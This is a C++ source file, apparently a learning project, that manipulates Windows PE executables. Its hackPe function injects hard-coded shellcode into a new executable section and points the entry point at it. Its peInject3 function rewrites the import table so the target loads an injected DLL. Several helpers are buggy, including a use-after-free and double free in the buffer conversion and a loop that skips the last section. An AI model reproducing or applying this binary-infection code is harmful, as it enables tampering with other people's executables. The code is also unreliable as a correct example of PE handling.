#include <iostream>
#include <Windows.h>
#include <tchar.h>
#include <sys/stat.h>
#include <filesystem>

using namespace std;

LPVOID readFile(PTCHAR fileName, size_t &fileSize) {
    FILE *file;
    fopen_s(&file, fileName, "rb");
    if (nullptr == file) {
        cout << "file open fail" << endl;
        return nullptr;
    }
    struct stat fileStat;
    stat(fileName, &fileStat);
    size_t size = fileStat.st_size;
    fileSize = size;
    auto fileBuffer = malloc(size);
    if (nullptr == fileBuffer) {
        cout << "malloc fail" << endl;
        return nullptr;
    }
    memset(fileBuffer, 0, size);
    fread(fileBuffer, size, 1, file);
    fclose(file);
    return fileBuffer;
}

BOOL writeFile(LPVOID fileBuffer, unsigned long size, PTCHAR newFileName) {
    FILE *file = nullptr;
    fopen_s(&file, newFileName, "wb");
    if (nullptr == file) {
        cout << "file create fail" << endl;
        return FALSE;
    }
    fwrite(fileBuffer, 1, size, file);
    fclose(file);
    return TRUE;
}

PIMAGE_NT_HEADERS getNtHeader(LPVOID buffer) {
    auto docHeader = (PIMAGE_DOS_HEADER) buffer;
    auto ntHeader = (PIMAGE_NT_HEADERS32) ((PTCHAR) buffer + docHeader->e_lfanew);
    return ntHeader;
}

PIMAGE_OPTIONAL_HEADER getOptionalHeader(LPVOID buffer) {
    auto ntHeader = getNtHeader(buffer);
    return &ntHeader->OptionalHeader;
}

PIMAGE_FILE_HEADER getFileHeader(LPVOID buffer) {
    auto ntHeader = getNtHeader(buffer);
    return &ntHeader->FileHeader;
}

PIMAGE_SECTION_HEADER getFirstSectionHeader(LPVOID buffer) {
    auto optionHeader = getOptionalHeader(buffer);
    auto ntHeader = getNtHeader(buffer);
    return (PIMAGE_SECTION_HEADER) ((PTCHAR) optionHeader + ntHeader->FileHeader.SizeOfOptionalHeader);
}

PIMAGE_SECTION_HEADER getLatestSectionHeader(LPVOID buffer) {
    return (PIMAGE_SECTION_HEADER) (getFirstSectionHeader(buffer) + getFileHeader(buffer)->NumberOfSections - 1);
}

size_t align(size_t size, int align) {
    return ((size / align) + 1) * align;
}

size_t peSize(LPVOID fileBuffer) {
    auto latestSectionHeader = getLatestSectionHeader(
            fileBuffer);
    return latestSectionHeader->PointerToRawData + latestSectionHeader->SizeOfRawData;
}

PTCHAR fileBufferToImageBuffer(LPVOID fileBuffer) {
    auto ntHeader = getNtHeader(fileBuffer);
    auto fileHeader = &ntHeader->FileHeader;
    auto optionHeader = &ntHeader->OptionalHeader;
    auto firstSectionHeader = (PIMAGE_SECTION_HEADER) ((PTCHAR) optionHeader + sizeof(*optionHeader));
    auto imageBuffer = (PTCHAR) malloc(optionHeader->SizeOfImage);
    memset(imageBuffer, 0, optionHeader->SizeOfImage);
    memcpy(imageBuffer, fileBuffer, optionHeader->SizeOfHeaders);
    free(fileBuffer);
    for (int i = 0; i < fileHeader->NumberOfSections; i++) {
        auto header = (PIMAGE_SECTION_HEADER) (firstSectionHeader + i);
        memcpy(imageBuffer + header->VirtualAddress, (PTCHAR) fileBuffer + header->PointerToRawData,
               header->Misc.VirtualSize);
    }
    return imageBuffer;
}


void imageBufferToFileBuffer(LPVOID imageBuffer, PTCHAR newFile) {
    auto ntHeader = getNtHeader(imageBuffer);
    auto fileHeader = &ntHeader->FileHeader;
    auto optionHeader = &ntHeader->OptionalHeader;
    auto firstSectionHeader = (PIMAGE_SECTION_HEADER) ((PTCHAR) optionHeader + sizeof(*optionHeader));
    auto latestSetionHeader = (PIMAGE_SECTION_HEADER) (firstSectionHeader + (fileHeader->NumberOfSections - 1));
    long fileSize = latestSetionHeader->PointerToRawData + latestSetionHeader->SizeOfRawData;
    auto fileBuffer = (PTCHAR) malloc(fileSize);
    memset(fileBuffer, 0, fileSize);
    memcpy(fileBuffer, imageBuffer, optionHeader->SizeOfHeaders);
    for (int i = 0; i < fileHeader->NumberOfSections; i++) {
        auto header = (PIMAGE_SECTION_HEADER) (firstSectionHeader + i);
        memcpy(fileBuffer + header->PointerToRawData, (PTCHAR) imageBuffer + header->VirtualAddress,
               header->Misc.VirtualSize);
    }
    writeFile(fileBuffer, fileSize, newFile);
    free(imageBuffer);
    free(fileBuffer);
}

LPVOID Rva2Foa(LPVOID buffer, DWORD rva) {
    auto ntHeader = getNtHeader(buffer);
    auto firstSectionHeader = getFirstSectionHeader(buffer);
    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections - 1; i++) {
        auto section = firstSectionHeader + i;
        if (rva >= section->VirtualAddress && rva < (section->VirtualAddress + section->Misc.VirtualSize)) {
            return (LPVOID) (rva - section->VirtualAddress + section->PointerToRawData);
        }
    }
    cout << "Rva2Foa error:" << rva << endl;
    return nullptr;
}

LPVOID Foa2Rva(LPVOID buffer, DWORD foa) {
    auto ntHeader = getNtHeader(buffer);
    auto firstSectionHeader = getFirstSectionHeader(buffer);
    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        auto section = firstSectionHeader + i;
//        cout << i << ":" << section->PointerToRawData << ":" << foa << ":" << (section->PointerToRawData + section->SizeOfRawData) << endl;
        if (foa >= section->PointerToRawData && foa < (section->PointerToRawData + section->SizeOfRawData)) {
            return (LPVOID) (foa - section->PointerToRawData + section->VirtualAddress);
        }
    }
    cout << "Foa2Rva error:" << foa << endl;
    return nullptr;
}

/**
 * 读取exe文件并复制到新的exe文件
 */
void readAndCompressFile() {
    string currentPath = filesystem::current_path().u8string();
    string fileNameStr = currentPath + R"(\..\resources\Demo.exe)";
    string newFileNameStr = currentPath + R"(\..\resources\Demo-Copy.exe)";
    PTCHAR fileName = fileNameStr.data();
    PTCHAR newFileName = newFileNameStr.data();
    size_t fileSize;
    LPVOID fileBuffer = readFile(fileName, fileSize);
    LPVOID imageBuffer = fileBufferToImageBuffer(fileBuffer);//拉伸
    imageBufferToFileBuffer(imageBuffer, newFileName);//压缩
    free(fileBuffer);
    free(imageBuffer);
}

LPVOID addSection(LPVOID fileBuffer, PTCHAR sectionName, size_t sectionCodeSize) {
    if (strlen(sectionName) >= 8) {
        cout << "sectionName size < 8" << endl;
        return nullptr;
    }
    auto ntHeader = getNtHeader(fileBuffer);
    size_t fileAlign = ntHeader->OptionalHeader.FileAlignment;
    size_t fileSize = peSize(fileBuffer);
    size_t outFileSize = fileSize + align(sectionCodeSize, fileAlign);
    auto newFileBuffer = malloc(outFileSize);
    memset(newFileBuffer, 0, outFileSize);
    memcpy(newFileBuffer, fileBuffer, fileSize);
    free(fileBuffer);
    auto newFileNtHeader = getNtHeader(newFileBuffer);
    auto newOptionHeader = &newFileNtHeader->OptionalHeader;
    auto newFileSectionHeader =
            (PIMAGE_SECTION_HEADER) ((PTCHAR) newOptionHeader +
                                     sizeof(*newOptionHeader));

    if ((newFileSectionHeader->PointerToRawData -
         (DWORD) (newFileSectionHeader + newFileNtHeader->FileHeader.NumberOfSections)) < 0x50) {
        cout << "table space not enought" << endl;
        return nullptr;
    }

    size_t sectionAlign = newFileNtHeader->OptionalHeader.SectionAlignment;
    auto newFileLatestSectionHeader =
            (PIMAGE_SECTION_HEADER) (newFileSectionHeader + (newFileNtHeader->FileHeader.NumberOfSections - 1));
    auto addSectionHeader = newFileLatestSectionHeader + 1;

    memcpy(addSectionHeader->Name, sectionName, 8);

    addSectionHeader->Misc.VirtualSize = align(sectionCodeSize, sectionAlign);
    addSectionHeader->VirtualAddress = align(
            newFileLatestSectionHeader->VirtualAddress + newFileLatestSectionHeader->Misc.VirtualSize,
            sectionAlign);
    addSectionHeader->SizeOfRawData = align(sectionCodeSize, fileAlign);
    addSectionHeader->PointerToRawData =
            newFileLatestSectionHeader->PointerToRawData + newFileLatestSectionHeader->SizeOfRawData;
    addSectionHeader->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;

    newFileNtHeader->FileHeader.NumberOfSections += 1;

    for (int i = 1; i < newFileNtHeader->FileHeader.NumberOfSections; i++) {
        newFileSectionHeader[i - 1].Misc.VirtualSize =
                newFileSectionHeader[i].VirtualAddress - newFileSectionHeader[i - 1].VirtualAddress;
    }

    newFileNtHeader->OptionalHeader.SizeOfImage = addSectionHeader->VirtualAddress + addSectionHeader->Misc.VirtualSize;
    newFileNtHeader->OptionalHeader.SizeOfHeaders += sizeof(*addSectionHeader);
    return newFileBuffer;
}

/**
 * pe文件注入shellcode
 */
void hackPe() {
    char shellcode[] = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
                       "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
                       "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
                       "\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
                       "\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
                       "\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"
                       "\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"
                       "\x49\x0b\x31\xc0\x51\x50\xff\xd7";;
    string currentPath = filesystem::current_path().u8string();
    string fileNameStr = currentPath + R"(\..\resources\Demo.exe)";
    PTCHAR fileName = fileNameStr.data();
    string fileNamePeStr = currentPath + R"(\..\resources\DemoPe.exe)";
    PTCHAR fileNamePe = fileNamePeStr.data();
    size_t fileSize;
    LPVOID fileBuffer = readFile(fileName, fileSize);
    LPVOID newFileBuffer = addSection(fileBuffer, (PTCHAR) ".import", sizeof(shellcode));
    auto ntHeader = getNtHeader(newFileBuffer);
    auto latestSectionHeader = getLatestSectionHeader(
            newFileBuffer);
    memcpy((PTCHAR) newFileBuffer + latestSectionHeader->PointerToRawData, shellcode, sizeof(shellcode));
    ntHeader->OptionalHeader.AddressOfEntryPoint = latestSectionHeader->VirtualAddress;
    size_t outFileSize = peSize(newFileBuffer);
    writeFile(newFileBuffer, outFileSize, fileNamePe);
    free(newFileBuffer);
}

void importTableInject(PTCHAR dllName) {
    string currentPath = filesystem::current_path().u8string();
    string fileNameStr = currentPath + R"(\..\resources\Demo.exe)";
    PTCHAR fileName = fileNameStr.data();
    size_t fileSize;
    LPVOID fileBuffer = readFile(fileName, fileSize);
    auto ntHeader = getNtHeader(fileBuffer);
    auto fileHeader = &ntHeader->FileHeader;
    auto optionHeader = &ntHeader->OptionalHeader;

    auto firstSectionHeader = (PIMAGE_SECTION_HEADER) ((PTCHAR) optionHeader + sizeof(*optionHeader));
    auto latestSectionHeader = firstSectionHeader + fileHeader->NumberOfSections - 1;
    auto addSection = latestSectionHeader + 1;
    memcpy(addSection->Name, ".hack", 8);
    addSection->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;

    //添加一个dll信息,所以在原来大小的基础上加一个导入表描述符大小加dll名字字符串大小+4个IMAGE_THUNK_DATA32大小
    addSection->Misc.VirtualSize =
            optionHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size + sizeof(IMAGE_IMPORT_DESCRIPTOR) +
            strlen(dllName) + 1 +
            sizeof(IMAGE_THUNK_DATA32) * 4;
    addSection->NumberOfLinenumbers = 0;
    addSection->NumberOfRelocations = 0;
    addSection->PointerToLinenumbers = 0;
    addSection->PointerToRawData = latestSectionHeader->PointerToRawData + latestSectionHeader->SizeOfRawData;
    addSection->PointerToRelocations = 0;
    addSection->VirtualAddress = align(latestSectionHeader->VirtualAddress + latestSectionHeader->Misc.VirtualSize,
                                       ntHeader->OptionalHeader.SectionAlignment);
    addSection->SizeOfRawData = align(addSection->Misc.VirtualSize, ntHeader->OptionalHeader.FileAlignment);
//    IMAGE_THUNK_DATA32
//    RVA2Offset();
}

void importTableToPe(PTCHAR dllPath) {
    string currentPath = filesystem::current_path().u8string();
    string fileNameStr = currentPath + R"(\..\resources\Demo.exe)";
    PTCHAR fileName = fileNameStr.data();
    size_t fileSize;
    LPVOID fileBuffer = readFile(fileName, fileSize);
    auto docHeader = (PIMAGE_DOS_HEADER) fileBuffer;
    auto ntHeader = (PIMAGE_NT_HEADERS32) ((PTCHAR) fileBuffer + docHeader->e_lfanew);
    auto fileHeader = &ntHeader->FileHeader;
    auto optionHeader = &ntHeader->OptionalHeader;

    auto firstSectionHeader = (PIMAGE_SECTION_HEADER) ((PTCHAR) optionHeader + sizeof(*optionHeader));
    auto latestSectionHeader = firstSectionHeader + fileHeader->NumberOfSections - 1;
    auto addSection = latestSectionHeader + 1;

    cout << sizeof(IMAGE_IMPORT_DESCRIPTOR) << endl;

    auto isOk = (PTCHAR) optionHeader->SizeOfHeaders -
                ((PTCHAR) ntHeader + IMAGE_SIZEOF_FILE_HEADER + fileHeader->SizeOfOptionalHeader +
                 40 * fileHeader->NumberOfSections);
    if (isOk < 80) {
        cout << "file not enought space" << endl;
    }
}

void peInject3() {
    PTCHAR sectionName = ".import";
    PTCHAR injectDllName = "Dll2.dll";
    PTCHAR injectFunctionName = "ExportFunction";
    string currentPath = filesystem::current_path().u8string();
    string fileNameStr = currentPath + R"(\..\resources\Demo.exe)";
    string fileNameNewStr = currentPath + R"(\..\resources\DemoNew.exe)";
    PTCHAR fileNameNewPe = fileNameNewStr.data();
    PTCHAR fileName = fileNameStr.data();
    size_t fileSize;
    LPVOID fileBuffer = readFile(fileName, fileSize);
    auto optionHeader = getOptionalHeader(fileBuffer);
    auto importDirectory = &optionHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    size_t inaSize = 0x0;
    size_t iatSize = 0x10;
    size_t dllNameLen = strlen(injectDllName) + 1;
    size_t newDataDirectoryLen = sizeof(IMAGE_IMPORT_DESCRIPTOR) * 2;
    size_t functionNameLen = strlen(injectFunctionName) + 1;
    size_t spaceLen = 0x2;
    size_t sectionLength =
            importDirectory->Size + newDataDirectoryLen + inaSize + iatSize + dllNameLen + functionNameLen + spaceLen;

    LPVOID newFileBuffer = addSection(fileBuffer, sectionName, sectionLength);

    auto dataDirectory = &getOptionalHeader(newFileBuffer)->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    auto latestSection = getLatestSectionHeader(newFileBuffer);
    auto newSectionFoa = (PDWORD) ((DWORD) newFileBuffer + latestSection->PointerToRawData);
    auto dataDirectionFoa = Rva2Foa(newFileBuffer, dataDirectory->VirtualAddress);
    auto oldImportDirectionAddr = (PIMAGE_IMPORT_DESCRIPTOR) ((DWORD) newFileBuffer + (DWORD) dataDirectionFoa);

    memcpy(newSectionFoa, oldImportDirectionAddr, dataDirectory->Size);

    auto newImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR) (
            (DWORD) newSectionFoa + dataDirectory->Size - sizeof(IMAGE_IMPORT_DESCRIPTOR));
    auto pIntTble = (PIMAGE_THUNK_DATA) ((DWORD) newImportDescriptor + 0x28);
    auto originPIntTable = pIntTble;
    //int
    pIntTble++;
    pIntTble->u1.Ordinal = 0x0;
    pIntTble++;

    //iat
    auto pIatTable = pIntTble;
    auto originPIatTable = pIatTable;
    pIatTable++;
    pIatTable->u1.Ordinal = 0x0;
    pIatTable++;

    //dll name
    auto dllNameAddr = (PDWORD) pIatTable;
    memcpy(dllNameAddr, injectDllName, strlen(injectDllName) + 1);

    //image_import_by_name
    auto functionNameAddr = (PIMAGE_IMPORT_BY_NAME) (PDWORD) (dllNameAddr + strlen(injectDllName) + 1);
    auto pFunctionName = (LPVOID) ((DWORD) functionNameAddr + 0x2);
    memcpy(pFunctionName, injectFunctionName, strlen(injectFunctionName) + 1);

    //copy image_import_by_name to iat and int
    originPIntTable->u1.AddressOfData = (DWORD) Foa2Rva(newFileBuffer,
                                                        (DWORD) functionNameAddr - (DWORD) newFileBuffer);
    originPIatTable->u1.AddressOfData = originPIntTable->u1.Ordinal;

    //revise name OriginFirstThunk , FirstThunk
    newImportDescriptor->Name = (DWORD) Foa2Rva(newFileBuffer,
                                                (DWORD) dllNameAddr - (DWORD) newFileBuffer);
    newImportDescriptor->OriginalFirstThunk = (DWORD) Foa2Rva(newFileBuffer, (DWORD) originPIntTable -
                                                                             (DWORD) newFileBuffer);
    newImportDescriptor->FirstThunk = (DWORD) Foa2Rva(newFileBuffer, (DWORD) originPIatTable -
                                                                     (DWORD) newFileBuffer);

    //revise image_data_directory.virtualaddress and size
    dataDirectory->VirtualAddress = (DWORD) Foa2Rva(newFileBuffer, latestSection->PointerToRawData);
    dataDirectory->Size += sizeof(IMAGE_IMPORT_DESCRIPTOR);

    size_t newFileSize = peSize(newFileBuffer);
    writeFile(newFileBuffer, newFileSize, fileNameNewPe);
}

int main() {
//    hackPe();
//    readAndCompressFile();
//    PTCHAR dllPath = "lake.dll";
//    importTableInject(dllPath);
//    importTableToPe(dllPath);
    peInject3();
    hackPe();
//    string currentPath = filesystem::current_path().u8string();
//    string fileNameStr = currentPath + R"(\..\resources\Demo.exe)";
//    PTCHAR fileName = fileNameStr.data();
//    size_t fileSize;
//    LPVOID fileBuffer = readFile(fileName, fileSize);
//
//
//    cout << fileBuffer << ":" << fileBuffer << ":" << hex <<(DWORD)fileBuffer << ":" << (PTCHAR)fileBuffer << endl;
    return 0;
}
